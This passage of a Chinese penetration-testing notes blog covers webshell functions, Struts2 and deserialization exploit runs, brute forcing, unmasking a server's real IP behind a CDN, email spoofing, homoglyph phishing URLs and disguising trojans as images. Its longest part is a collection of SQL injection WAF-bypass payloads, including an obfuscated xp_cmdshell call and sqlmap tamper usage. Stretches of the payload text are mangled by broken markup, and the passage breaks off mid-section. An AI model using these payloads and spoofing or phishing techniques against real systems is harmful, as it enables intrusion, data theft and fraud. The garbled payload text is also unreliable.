title="PHP木马后门常用命令"></a>PHP木马后门常用命令</h3><p>1.执行系统命令：<code>system，passthru，shell_exec,exec,popen,proc_open</code><br>2.代码执行与加密：<code>eval，assert，call_user_func,base64_decode,gzinflate,gzuncompress,gzdecode,str_rot13</code><br>3.文件包含与生成：<code>require,require_once,include,include_once,file_get_contents,file_put_contents,fputs,fwrite</code>  </p><h3 id="禁止webshell执行命令"><a href="#禁止webshell执行命令" class="headerlink" title="禁止webshell执行命令"></a>禁止webshell执行命令</h3><p>php配置文件里面有个disable_functions=配置，这个禁止一些执行命令的函数。</p><h3 id="Struts2框架漏洞"><a href="#Struts2框架漏洞" class="headerlink" title="Struts2框架漏洞"></a>Struts2框架漏洞</h3><p>首先安装apache，配置java环境变量，安装struts2框架。<br>注意事项：<br>首先在struts.xml配置文件添加<constant name="struts.mapper.alwaysSelectFullNamespace" value="true"><br>其次修改配置文件struts-actionchaining.xml 删掉namespace属性，或使用了通配符*<br>最后把type=”chain”改成type=”redirectAction”<br>最后根据视频步骤进行攻击。使用K8进行漏洞获取。<br>*<em>struts2命令执行漏洞攻防演示 *</em><br>历史漏洞：<a href="https://www.seebug.org/search/?keywords=struts2" target="_blank" rel="noopener">https://www.seebug.org/search/?keywords=struts2</a><br>（1）s2早期综合利用工具<br>（2）s2-045漏洞还原<br>（3）s2-48攻击过程还原<br>struts2 S2-048远程代码执行漏洞exp<br>C:&gt;struts048.py <a href="http://ip:8081/struts2-showcase/integration/saveGangster.action" target="_blank" rel="noopener">http://ip:8081/struts2-showcase/integration/saveGangster.action</a> “ipconfig”<br>使用python写的payload执行ipconfig命令<br>（4）s2-052攻击过程还原(针对版本struts 2.5-2.5.12)<br>Struts S2-052漏洞利用之Meterpreter（CVE-2017-9805）<br><a href="https://www.cnblogs.com/Hi-blog/p/7510987.html" target="_blank" rel="noopener">https://www.cnblogs.com/Hi-blog/p/7510987.html</a><br> (5) S2-057漏洞复现（需要参数alwaysSelectFullNamespace被设置为true)<br>Apache struts2 namespace远程命令执行—CVE-2018-11776(S2-057)漏洞复现<br><a href="http://ip:8081/struts2-showcase/actionChain1.action" target="_blank" rel="noopener">http://ip:8081/struts2-showcase/actionChain1.action</a><br>参考文章：<br><a href="https://blog.csdn.net/weixin_43625577/article/details/97111575" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43625577/article/details/97111575</a><br><a href="https://www.sinesafe.com/article/20180823/struts2057.html" target="_blank" rel="noopener">https://www.sinesafe.com/article/20180823/struts2057.html</a></constant></p><h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><p>假设，我们写了一个class，这个class里面存有一些变量。当这个class被实例化了之后，在使用过程中里面的一些变量值发生了改变。以后在某些时候还会用到这个变量，如果我们让这个class一直不销毁，等着下一次要用它的时候再一次被调用的话，浪费系统资源。当我们写一个小型的项目可能没有太大的影响，但是随着项目的壮大，一些小问题被放大了之后就会产生很多麻烦。这个时候PHP就和我们说，你可以把这个对象序列化了，存成一个字符串，当你要用的时候再放他出来就好了。在我们讲PHP反序列化的时候，基本都是围绕着serialize()，unserialize()这两个函数。<br>详细参考：<a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a><br>在pikachu环境中找到php反序列化，使用该环境进行测试。<br>序列化过程代码<br>    class S{<br>        public $test= “pikachu”;</p><pre><code>}    $s=new S();//创建一个对象    serialize($S);//把对象序列化。序列化后得到O:1:&quot;S&quot;:1:{S:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;}其中 O:代表object    1：代表对象的名字为一个字符    s：对象的名称    1：代表对象里面有一个变量    s:数据类型    4：变量名称的长度    s:数据类型    7：变量的长度    pikachu：变量值反序列化就是将上面的字符串在转为php代码</code></pre><p>反序列化产生的条件<br>1.反序列化的内容是可控的，例如上面序列化后的字符串更改为<code>O:1:&quot;S&quot;:1:{S:4:&quot;test&quot;;s:7:&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;;}</code><br>2.后台使用了php中的魔法函数<br>在pikachu中输入上面1中的更改后的字符串，就会执行指定的代码<br><strong>Jboss反序列化漏洞</strong>，利用反序列化工具和使用seebug上面的漏洞。<br><a href="https://www.jianshu.com/p/e34062e0a6f1" target="_blank" rel="noopener">https://www.jianshu.com/p/e34062e0a6f1</a><br>新漏洞利用工具下载：<a href="https://github.com/yunxu1/jboss-_CVE-2017-12149" target="_blank" rel="noopener">https://github.com/yunxu1/jboss-_CVE-2017-12149</a><br>老漏洞综合利用工具下载：<a href="https://download.csdn.net/download/sinat_26474359/10650591" target="_blank" rel="noopener">https://download.csdn.net/download/sinat_26474359/10650591</a><br><strong>weblogic反序列化漏洞</strong>：<br>Weblogic 常见漏洞有那些：弱口令、Java 反序列化漏洞操作（CVE-2018-2628）、<br>任意文件上传漏洞操作（CVE-2018-2894）、XML Decoder 反序列化漏洞操作（CVE-2017-10271）、SSRF 漏洞（前提是需要安装Weblogic时选择UDDI组件）、反序列化漏洞（CVE-2019-2725 参考<a href="https://www.0dayhack.com/post-883.html）" target="_blank" rel="noopener">https://www.0dayhack.com/post-883.html）</a><br>weblogic反序列化工具bate1.1香草</p><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><p>基于B/s暴力破解：使用burpsuit，当用户输入用户名和密码之后被burpsuit拦截，然后使用软件中的测试器中的位置选项，选取其中的爆破选项进行破解。需要尽量获取更多的信息。<br>基于C/S暴力破解：常用工具Hydra（kali自带）,Bruter,用来爆破系统密码等其中Hydra在kali中含有图形化界面而且kali中自带字典，路径自己查。<br><strong>真空密码生成器</strong>  </p><h3 id="验证码绕过"><a href="#验证码绕过" class="headerlink" title="验证码绕过"></a>验证码绕过</h3><p>验证码的作用就是为了区别计算机和人操作。<br><strong>验证码在客户端产生的问题</strong><br>1.验证码在客户端产生并且在前端使用js进行验证。这样攻击者通过删除前端的js验证码则可以绕过验证<br>2.验证码输出在客户端，也容易被盗取。<br>3.验证码输出在cookie中。有的程序员设置计数方式，当用户三次输入错误之后才进行验证码认证，其中计数器设置在cookie中进行计数，这样提供了用户体验感，但是攻击者在抓包之后删除了了cookie，这样计算机就会一直认为攻击者是第一次登录，进而不会产生验证码。<br><strong>服务端验证码产生的问题</strong><br>1.验证码不过期，在登录之后没有及时销毁，那么攻击者可以利用这个验证码进行登录（php默认销毁时间是23分钟）<br>2.没有进行非空判断。<br>3.验证码的提供的问题数量有限<br><strong>token破解</strong><br>token只能防CSRF攻击，但是不能防暴力破解。在burpsuit中线程数设置为1，grep-extract设置好开始为 token “value = “ 结束为”/&gt;，有效载荷设置为递归搜索。即可进行破解。<br><strong>验证码识别破解</strong><br>攻击工具PKav，可自动识别一些简单的数字验证码等。  </p><h2 id="编辑器漏洞"><a href="#编辑器漏洞" class="headerlink" title="编辑器漏洞"></a>编辑器漏洞</h2><p>略。</p><h2 id="旁注"><a href="#旁注" class="headerlink" title="旁注"></a>旁注</h2><p>旁注，我们可以理解为在同一服务器上的多个站点。在进行web站点架设的时候，很多时候由于成本等方面的原因，我们会在一个服务器上架设多个web站点，然后通过主机头对网站进行区分，使得可以通过不同域名访问到不同的web站点。<br>查询其他web站点：通过ping 一个网站，然后通过ping出来的ip地址使用反查技术获取其他web站点名称。<br>反查网址：<a href="http://tool.chinaz.com/Same/" target="_blank" rel="noopener">http://tool.chinaz.com/Same/</a><br><a href="http://dns.aizhan.com/" target="_blank" rel="noopener">http://dns.aizhan.com/</a><br><a href="http://www.11best.com/ip/" target="_blank" rel="noopener">http://www.11best.com/ip/</a>  </p><h3 id="跨库查询"><a href="#跨库查询" class="headerlink" title="跨库查询"></a>跨库查询</h3><p>在目前来看，跨库查询是指由于权限设置不严格，导致普通帐号被授予过高的权限，从而使得其可以对其他的数据库进行操作。比如，在mysql中，informatin_schema这个表默认只有root有权限进行操作。但是如果一个普通账户权限过高后，他便可以对该数据库进行操作，从而影响整个mysql数据库的运行。  </p><h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><p>由于互联网非常大，如果想访问我们站点的用户与我们的站点延迟非常大(例如从广东到北京)，导致网站首页打开都非常慢，这会直接影响到用户的访问体验。于是就出现了CDN，我们可以把CDN看作是我们web站点的镜像服务器，我们在站点架设好之后，只需要将DNS指向修改一下，就可以将所有用户的访问指向到CDN。CDN一般在全国各地都有，提高了用户访问速度；并且由于攻击者没有真实IP地址（CDN会自己指定一个ip），哪怕攻陷了CDN也不会对我们的服务器有任何影响，所以CDN解决了访问速度以及提高安全性这两个问题。我们要想办法找到CDN后面的真实服务器IP地址。下面介绍几个找到服务器真实IP地址的方法：<br>1.大型站点一般除了www的子域之外还会有mail、oa、crm等其他二级域名。我们这个时候可以在google搜索下site:XXX.com –www 或者site:xxx.com mail 来搜索其他的二级域名。通过其他的二级域名DNS解析所对应的IP地址来判断其拥有的IP地址段。一般情况下， www有可能是托管在其他地方但是mail服务器一般是企业自行运营维护。在获得其IP地址段之后，可以在浏览器地址栏通过直接访问IP地址或是使用nmap来进行整段扫描确认其真实IP地址。<br>2。通过多地ping来确认其真实IP地址；web站点架设的目的就是提供给人访问，有时候考虑到访问速度的问题会使用CDN提高访问速度，对于这种站点，可通过多地ping的方式，来判断其web服务器的真实IP地址。<br>多地ping工具：<br><a href="http://ping.chinaz.com/" target="_blank" rel="noopener">http://ping.chinaz.com/</a><br><a href="http://ping.aizhan.com/" target="_blank" rel="noopener">http://ping.aizhan.com/</a><br><a href="http://ce.cloud.360.cn/" target="_blank" rel="noopener">http://ce.cloud.360.cn/</a><br>结果中如果出现多个ip归属地说明存在CDN（例<a href="http://www.163.com），如果只有一个IP归属地则没有(例www.oldboyedu.com)。" target="_blank" rel="noopener">www.163.com），如果只有一个IP归属地则没有(例www.oldboyedu.com)。</a><br>3.通过命令 nslookup <a href="http://www.163.com" target="_blank" rel="noopener">www.163.com</a> 观察结果出出现的ip地址，如果有多个说明存在CDN，反之则不存在。<br><strong>CDN绕过</strong><br>（1）查看IP与域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：<br><a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a> ###DNS查询<br><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a> ###微步在线<br><a href="http://toolbar.netcraft.com/site_report?url=" target="_blank" rel="noopener">http://toolbar.netcraft.com/site_report?url=</a> ###在线域名信息查询<br><a href="http://viewdns.info/" target="_blank" rel="noopener">http://viewdns.info/</a> ###DNS、IP等查询<br><a href="https://tools.ipip.net/cdn.php" target="_blank" rel="noopener">https://tools.ipip.net/cdn.php</a> ###CDN查询IP  </p><p>（2）利用SecurityTrails平台，攻击者就可以精准的找到真实原始IP。他们只需在搜索字段中输入网站域名，然后按Enter键即可，这时“历史数据”就可以在左侧的菜单中找到。<br><a href="https://securitytrails.com/domain/oldboyedu.com/dns" target="_blank" rel="noopener">https://securitytrails.com/domain/oldboyedu.com/dns</a><br>除了过去的DNS记录，即使是当前的记录也可能泄漏原始服务器IP。例如，MX记录是一种常见的查找IP的方式。如果网站在与web相同的服务器和IP上托管自己的邮件服务器，那么原始服务器IP将在MX记录中。<br>(3)观看ip变化<br><a href="http://toolbar.netcraft.com/site_report?url=www.oldboyedu.com" target="_blank" rel="noopener">http://toolbar.netcraft.com/site_report?url=www.oldboyedu.com</a><br>方法2:查询子域名<br>（1）微步在线(<a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a>)<br>（2）Dnsdb查询法(<a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a>)<br>（3）Google 搜索Google site:baidu.com -www就能查看除www外的子域名<br>（4）各种子域名扫描器<br>（5）网络空间引擎搜索法<br>常见的有以前的钟馗之眼，shodan，fofa搜索。<br>以fofa为例，只需输入：title:“网站的title关键字”或者body：“网站的body特征”就可以找出fofa收录的有这些关键字的ip域名，很多时候能获取网站的真实ip。<br>（6）利用SSL证书寻找真实原始IP<br>oldboyedu.com证书的搜索查询参数为：parsed.names：oldboyedu.com<br>只显示有效证书的查询参数为：tags.raw：trusted<br>(7)使用国外主机解析域名<br>国内很多 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的主机直接访问可能就能获取到真实IP。<br>(8)方法网站漏洞查找<br>    1）目标敏感文件泄露，例如：phpinfo之类的探针、”info.php”, “phpinfo.php”, “test.php”,   “l.php”、GitHub信息泄露等。<br>    2）查看漏洞扫描报警信息，手工造成页面报错<br>    3）XSS盲打，命令执行反弹shell，SSRF等。<br>    4）无论是用社工还是其他手段，拿到了目标网站管理员在CDN的账号，从而在从CDN的配置中找到网站的真实IP。  </p><p>(9)方法9:网站邮件订阅查找<br>RSS邮件订阅，很多网站都自带 sendmail，会发邮件给我们，此时查看邮件源码里面就会包含服务器的真实 IP 了。<br>(10)：用 Zmap 扫全网<br>比如要找 xiaix.me 网站的真实 IP，我们首先从 apnic 获取 IP 段，然后使用 Zmap 的 banner-grab 扫描出来 80 端口开放的主机进行 banner 抓取，最后在 http-req 中的 Host 写 xiaix.me。<br>大概就这些了吧，其他的什么像 DDoS 把 CDN 流量打光的这种就算了吧，最好还是别干扰到人家网站的正常运转吧。<br>(11)：F5 LTM解码法<br>当服务器使用F5 LTM做负载均衡时，通过对set-cookie关键字的解码真实ip也可被获取，例如：Set-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000，先把第一小节的十进制数即487098378取出来，然后将其转为十六进制数1d08880a，接着从后至前，以此取四位数出来，也就是0a.88.08.1d，最后依次把他们转为十进制数10.136.8.29，也就是最后的真实ip<br>（12）、通过信息报错或访问相关测试页面（）  </p><h2 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h2><p>1、原理概述<br>如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作。 越权漏洞形成的原因是后台使用了不合理的权限校验规则导致的。<br>一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，<strong>当用户对权限页面内的信息进行这些操作时，后台需要对当前用户的权限进行校验，看其是否具备操作的权限，</strong>从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。（这种漏洞扫描器无法发现，通常只有手动渗透）</p><p>2、越权分类<br>平行越权：A用户和B用户属于同一级别用户，但各自不能操作对方个人信息，A用户如果越权操作B用户的个人信息的情况称为平行越权操作。<br>查看源码我们看到，漏洞产生的原因是因为用户进行需要权限的操作时，没有对用户权限进行合理的验证，例如下面只验证提交信息和用户名，没有对当前session中的权限进行验证，导致如果在get方式提交后攻击者访问其他用户信息，只需要将username修改即可查看其他用户信息。 在pikachu中进行操作。</p><pre><code>&gt; if(isset($_GET[&#39;submit&#39;]) &amp;&amp; $_GET[&#39;username&#39;]!=null){&gt; //没有使用session来校验,而是使用的传进来的值，权限校验出现问题,这里应该跟登录态关系进行绑定&gt; $username=escape($link, $_GET[&#39;username&#39;]);&gt; $query=&quot;select * from member where username=&#39;$username&#39;&quot;;&gt; $result=execute($link, $query);</code></pre><p>垂直越权:A用户权限高于B用户，B用户越权操作A用户的权限的情况称为垂直越权。<br>实战略<br>如果验证方式使用javascipt在前端进行验证，那么我们在浏览器的设置里面点击网站设置，将javascript禁用，并添加禁用的网站就可以绕过javascript的验证。</p><h2 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h2><p>具体情况具体分析。参考文档。</p><h2 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h2><h3 id="邮件安全三大协议"><a href="#邮件安全三大协议" class="headerlink" title="邮件安全三大协议"></a>邮件安全三大协议</h3><p>1.SPF是 Sender Policy Framework 的缩写，一种以IP地址认证电子邮件发件人身份的技术。 接收邮件方会首先检查域名的SPF记录，来确定发件人的IP地址是否被包含在SPF记录里面，如果在，就认为是一封正确的邮件，否则会认为是一封伪造的邮件进行退回。例如：当邮件服务器收到自称发件人是<a href="mailto:spam@gmail.com">spam@gmail.com</a>的邮件，那么到底它是不是真的gmail.com的邮件服务器发过来的呢，我们可以查询gmail.com的SPF记录，以此防止别人伪造你来发邮件。<br>2.DKIM让企业可以把加密签名插入到发送的电子邮件中，然后把该签名与域名关联起来。签名随电子邮件一起传送，而不管是沿着网络上的哪条路径传送， 电子邮件收件人则可以使用签名来证实邮件确实来自该企业。可确保邮件内容不被偷窥或篡改。<br>3.DMARC（Domain-based Message Authentication, Reporting &amp; Conformance）是txt记录中的一种，是一种基于现有的SPF和DKIM协议的可扩展电子邮件认证协议，其核心思想是邮件的发送方通过特定方式（DNS）公开表明自己会用到的发件服务器（SPF）、并对发出的邮件内容进行签名(DKIM)，而邮件的接收方则检查收到的邮件是否来自发送方授权过的服务器并核对签名是否有效。对于未通过前述检查的邮件，接收方则按照发送方指定的策略进行处理，如直接投入垃圾箱或拒收。从而有效识别并拦截欺诈邮件和钓鱼邮件，保障用户个人信息安全。  </p><h3 id="邮件伪造"><a href="#邮件伪造" class="headerlink" title="邮件伪造"></a>邮件伪造</h3><p>邮件伪造最根本的原因就是SMTP协议<strong>不会验证发送者</strong>的身份，当邮件在两个不同的SMTP邮件服务器中被传输时，我们可以通过伪造来源欺骗接收者的SMTP服务器。没有配置SPF，邮件服务器就不会去验证发件人，就可以直接进行伪造了。邮件伪造网站<a href="http://tool.chacuo.net/mailanonymous。邮件伪造工具：" target="_blank" rel="noopener">http://tool.chacuo.net/mailanonymous。邮件伪造工具：</a><br>这种情况就需要用一些权威的邮件服务商去发送邮件了如sendgrid，mailgun，这些权威邮件服务商，会被大部分邮件服务商加到白名单中，这样他们的邮件就不会进到垃圾箱。  </p><h3 id="钓鱼网站"><a href="#钓鱼网站" class="headerlink" title="钓鱼网站:"></a>钓鱼网站:</h3><p>网址伪造，使用一些特殊的字符，代替正规网址的一些容易伪造的字符。<br>UniCode编码表<a href="https://www.cnblogs.com/csguo/p/7401874.html，在这里面可以找到各种各样的字符进行替换。" target="_blank" rel="noopener">https://www.cnblogs.com/csguo/p/7401874.html，在这里面可以找到各种各样的字符进行替换。</a>  </p><h2 id="APT攻击"><a href="#APT攻击" class="headerlink" title="APT攻击"></a>APT攻击</h2><p>可以使用工具kiler Rat 将一个程序后缀名改为.jpg，迷惑用户进行点击<br>使用工具resourse hacker 可以更改应用程序的图标，创建木马程序等。<br>APT攻击：针对特定目标的攻击。  </p><h2 id="其他漏洞总结"><a href="#其他漏洞总结" class="headerlink" title="其他漏洞总结"></a>其他漏洞总结</h2><p>如果获得登录页面，但是没有账号密码，应该怎样破解？<br>1.暴力破解<br>2.扫敏感目录及文件<br>3.报错的页面图片也存在XSS漏洞<br>4.隐藏域中存在明文密码。（明文密码存在于当前页面的源码中）<br>5.逻辑漏洞-任意密码重置<br>6.短信炸弹<br>7.SVN源码泄露<br>8.扫描局域网共享<br>9.HTTP响应拆分漏洞<br>10.发掘隐藏的连接地址，例如登录页面中，有个帮助连接，或者相关软件等连接，也可以进行测试<br>11.IIS短文件名漏洞<br>12.JQuery1.7版本一下存在XSS漏洞<br>13.目录浏览漏洞<br>14.URL跳转漏洞<br>15.框架钓鱼漏洞<br>16.未加密登录请求<br>17.HTTP报头追踪漏洞<br>18.DNS域传送漏洞<br>19.私有ip泄露<br>20.网络物理路径信息泄露漏洞<br>21.系统重装漏洞<br>22.任意文件下载  </p><h2 id="渗透思路"><a href="#渗透思路" class="headerlink" title="渗透思路"></a>渗透思路</h2><p><strong>漏洞扫描</strong>使用AWVS ，Nessus，Xray(推荐)。<br><strong>万能密码绕过</strong>。例如’or 1=1 –-    “or “a”=”a<br><strong>弱口令爆破</strong>：弱口令爆破工具推荐,详情可看以下，不在赘述：<br><strong>Hydra</strong>：<a href="https://yq.aliyun.com/articles/608406/" target="_blank" rel="noopener">https://yq.aliyun.com/articles/608406/</a><br><strong>超级弱口令</strong>：链接：<a href="https://pan.baidu.com/s/1mkwnxu19Aq-KEVCWOZn99w" target="_blank" rel="noopener">https://pan.baidu.com/s/1mkwnxu19Aq-KEVCWOZn99w</a> 提取码：blj3<br><strong>御剑RDP爆破</strong>: <a href="https://github.com/foryujian/yujianrdpcrack" target="_blank" rel="noopener">https://github.com/foryujian/yujianrdpcrack</a><br><strong>Bruter:</strong> <a href="https://www.uedbox.com/post/8478/" target="_blank" rel="noopener">https://www.uedbox.com/post/8478/</a><br><strong>定制化生成字典：</strong> <a href="http://tools.mayter.cn/" target="_blank" rel="noopener">http://tools.mayter.cn/</a><br><strong>字典：</strong> <a href="https://github.com/rootphantomer/Blasting_dictionary" target="_blank" rel="noopener">https://github.com/rootphantomer/Blasting_dictionary</a><br><strong>目录扫描</strong><br><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a> ,DirSearch可以多级别扫描，在枚举子目录的目录，很多时候可以找到突破口。<br>御剑：<a href="https://github.com/52stu/-" target="_blank" rel="noopener">https://github.com/52stu/-</a> 也是比较常用的<br><strong>JS扫描</strong><br>JS文件我们在渗透测试中也是经常用到的东西，例如重置密码的JS，发送短信的JS，都是有可能未授权可访问的。JS扫描的话推荐使用JSFind: <a href="https://github.com/Threezh1/JSFinder" target="_blank" rel="noopener">https://github.com/Threezh1/JSFinder</a><br><strong>nmap扫描</strong>  </p><h2 id="渗透测试报告"><a href="#渗透测试报告" class="headerlink" title="渗透测试报告"></a>渗透测试报告</h2><p>使用模板</p><h2 id="源代码审计"><a href="#源代码审计" class="headerlink" title="源代码审计"></a>源代码审计</h2><p>略</p><h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><p>英文：web applacation firwall<br>waf工作在第五层，属于应用层防火墙，传统的防火墙是在第三层工作的，实现网络层的防御。<br>云waf是将真实的ip地址隐藏，使攻击者找不到真正的ip地址<br>绕过方法：以<a href="http://www.oldboyedu.com为例，ping通之后不是真正的ip地址，需要寻找到真正的ip地址，在浏览器中输入dljlf.oldboyedu.com也能访问网站，说明该网站使用了泛地址，即与网站相似的域名都可以进行访问该网站，此时ping" target="_blank" rel="noopener">www.oldboyedu.com为例，ping通之后不是真正的ip地址，需要寻找到真正的ip地址，在浏览器中输入dljlf.oldboyedu.com也能访问网站，说明该网站使用了泛地址，即与网站相似的域名都可以进行访问该网站，此时ping</a> dljlf.oldboyedu.com 后可以看到真正的ip地址。</p><h3 id="waf身份验证绕过"><a href="#waf身份验证绕过" class="headerlink" title="waf身份验证绕过"></a>waf身份验证绕过</h3><p><strong>方法一</strong>绕过方法一：伪造搜索引擎<br>老版本的WAF是有这个漏洞的，就是把User-Agent修改为搜索引擎（例如百度），便可以绕过，进行sql注入等攻击, 这里推荐一个火狐插件，可以修改User-Agent，叫User-Agent Switcher 下载地址: <a href="https://addons.mozilla.org/zh-CN/firefox/addon/user-agent-switcher/安装完后重启Firefox浏览器" target="_blank" rel="noopener">https://addons.mozilla.org/zh-CN/firefox/addon/user-agent-switcher/安装完后重启Firefox浏览器</a>, 打开User Agent Switcher设置面板点击你要添加的分组然后点击New User Agent输入User Agent信息然后点击确定<br>也可以使用burpsuit修改USER-Agent:抓包之后将user-agent改为baiduspider即可绕过。同时在burpsuit中进行批量替换<br><strong>方法二</strong>伪造白名单特殊目录  参考<a href="http://www.wooyun.org/bugs/wooyun-2014-050576" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2014-050576</a><br><strong>方法三</strong>直接攻击源站，寻找到源站进行攻击。  </p><h3 id="waf数据包解析的绕过"><a href="#waf数据包解析的绕过" class="headerlink" title="waf数据包解析的绕过"></a>waf数据包解析的绕过</h3><p>1.<strong>编码绕过</strong>：将访问数据库的语句进行url编码，生成url编码后进行访问，waf可能识别不出来。（但是现在这种方法不好用）<br>2.<strong>修改请求方式绕过</strong><br>：例如waf通常会检测get方式提交的代码，但是一般不会检测cookie和post提交的代码，所以将get方式改为post方式即可。<br>3.<strong>复参数绕过</strong><br>例如一个请求是这样的<br>GET /pen/news.php?id=1 union select user,password from mysql.user不能通过检测<br>可以修改为<br>GET pen/news.php?id=1&amp;id=union&amp;id=select&amp;id=user,password&amp;id=from%20mysql.user。计算机会将语句自动进行拼接整理，很多WAF都可以这样绕，测试最新版WAF能绕过部分语句<br>4.<strong>WAF触发规则的绕过</strong><br>WAF主要是针对一些特殊的关键词或者用法进行检测。绕过方法很多，也是最有效的。<br>绕过策略一：特殊字符替换空格<br>用一些特殊字符代替空格，比如在mysql中<strong>%0a</strong>是换行，可以代替空格，这个方法也可以部分绕过最新版本的WAF，在sqlserver中可以用<code>/**/</code>代替空格，也可以使用如下方法：<br><a href="http://192.168.0.142:8080/sql.php?id=1/*|%23--%23|*/union/*|%23--%23|*/select/*|%23--%23|*/1,user(),3,4,5" target="_blank" rel="noopener">http://192.168.0.142:8080/sql.php?id=1/*|%23--%23|*/union/*|%23--%23|*/select/*|%23--%23|*/1,user(),3,4,5</a><br><a href="http://192.168.0.142:8080/sql.php?id=1/*|%23--%23|*/and/*|%23--%23|*/1=2" target="_blank" rel="noopener">http://192.168.0.142:8080/sql.php?id=1/*|%23--%23|*/and/*|%23--%23|*/1=2</a><br>绕过策略二：特殊字符拼接<br>把特殊字符拼接起来绕过WAF的检测，比如在Mysql中，可以利用注释/<strong>/来绕过，在mssql中，函数里面可以用+来拼接<br>如：GET /pen/news.php?id=1;exec(master..xp_cmdshell ‘net user’)<br>可以改为：GET /pen/news.php?id=1; exec(‘maste’+’r..xp’+’_cmdshell’+’”net user”‘)<br>绕过策略三：注释包含关键字<br>在mysql中，可以利用/<em>!</em>/包含关键词进行绕过，在mysql中这个不是注释，</strong>而是取消注释的内容<strong>。测试最新版本的WAF可以完美绕过。<br>如: GET /pen/news.php?id=1 union select user,password from mysql.user<br>可以改为: GET /pen/news.php?id=1 /<em>!union</em>/ /<em>!select</em>/  user,password /<em>!from</em>/ mysql.user<br>绕过策略四：<br>也可以尝试seelct~ select~1 select! select@等绕过成功<br>5空格替换法<br>把空格替换成`%0a /</strong>/<code>可以绕过最新版本WAF, 在Pangolin中 点击 编辑-- 配置-- 高级-- 选择替换空格使用-- 填上</code>%0a/<strong>/<code>即可http://192.168.0.142:8080/sql.php?id=1%20union%23%0aselect%23%0a1,user(),3,4,5  6.使用大小写</code><a href="http://www" target="_blank" rel="noopener">http://www</a>.*</strong>.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4….<code>7.关键字替换</code><a href="http://www.***.com/index.php?page_id=-15" target="_blank" rel="noopener">http://www.***.com/index.php?page_id=-15</a> UNIunionON SELselectECT 1,2,3,4….<code>此方法适用于一些会把union select替换掉的WAF，经过WAF过滤后就会变成 union select 1,2,3,4....  8.编码与注释结合</code><a href="http://www.***.com/index.php?page_id=-15" target="_blank" rel="noopener">http://www.***.com/index.php?page_id=-15</a> %55nION/**/%53ElecT 1,2,3,4…`</p><pre><code>http://192.168.0.142:8080/sql.php?id=1/*!50000*/union/*!50000*/select/*!50000*/1,user(),3,4,5</code></pre><p>也可以这样<br><code>http://192.11.22.55/sqli/Less-1/?id=1&#39; and /*!1=1*/ %23</code> (WAF不拦截)<br>      U替换为%55，S替换为%53 在 union 和 select 之间添加注释/**/<br>手工进行加注释进行注入太慢，一般我们通过Sqlmap这类工具来实现自动注入:</p><pre><code>sqlmap.py -u &quot;URL&quot; --tamper=&quot;versionedmorekeywords.py&quot; --dealy=1</code></pre><p>9.利用WAF本身的功能绕过<br> 假如你发现WAF会把”*”替换为空，那么你就可以利用这一特性来进行绕过<br>‍‍‍<a href="http://www.site.com/index.php?page_id=-15+uni*on+sel*ect+1,2,3,4" target="_blank" rel="noopener">http://www.site.com/index.php?page_id=-15+uni*on+sel*ect+1,2,3,4</a>….<br>其它方法-15+(uNioN)+(sElECt)….-15+(uNioN+SeleCT)+…-15+(UnI)(oN)+(SeL)(ecT)+….-15+union (select 1,2,3,4…)<br>10.使用其他变量或者命令对注入语句进行替换</p><blockquote><pre><code>COMMAND | WHAT TO USE INSTEAD@@version | version()concat() | concat_ws()group_concat() | concat_ws()= | like</code></pre></blockquote><p>11.组合绕过waf<br>先判断注入点，把and为&amp;&amp;,url编码后为%26%26<br><a href="http://192.168.0.102:8080/sql.php?id=1%20%26%26%20-1=-2" target="_blank" rel="noopener">http://192.168.0.102:8080/sql.php?id=1%20%26%26%20-1=-2</a><br><strong>下面我们具体讲解绕过方法：</strong><br>1.利用()代替空格<br>2.利用mysql特性/<em>!</em>/执行语句<br>3.利用/<strong>/混淆代码<br>我给出的注入语句是：<br>    `union/<em>%00</em>//<em>!50010select</em>/(database/</strong>/()),(user/<strong>/())%23<code></code>id=1/<em>|%23–%23|</em>/unioN/<em>|%23–%23|</em>/sElect/<em>|%23–%23|</em>/1,user(),(database/</strong>/()),4,5<code>http://192.168.0.102:8080/sql.php?id=1 union/*%00*//*!50010select*/1,user(),version(),4,5这里要注意的几点是：  1.mysql关键字中是不能插入</code>/<strong>/<code>的，即</code>se/</strong>/lect<code>是会报错的，但是函数名和括号之间是可以加上</code>/<strong>/<code>的,像</code>database/</strong>/()`这样的代码是可以执行的<br>2./<em>!</em>/中间的代码是可以执行的，其中50010为mysql版本号，只要mysql大于这个版本就会执行里面的代码<br>3.数据或者函数周围可以无限嵌套()<br>4.利用好%00<br>完整过狗注入语句<br>判断： 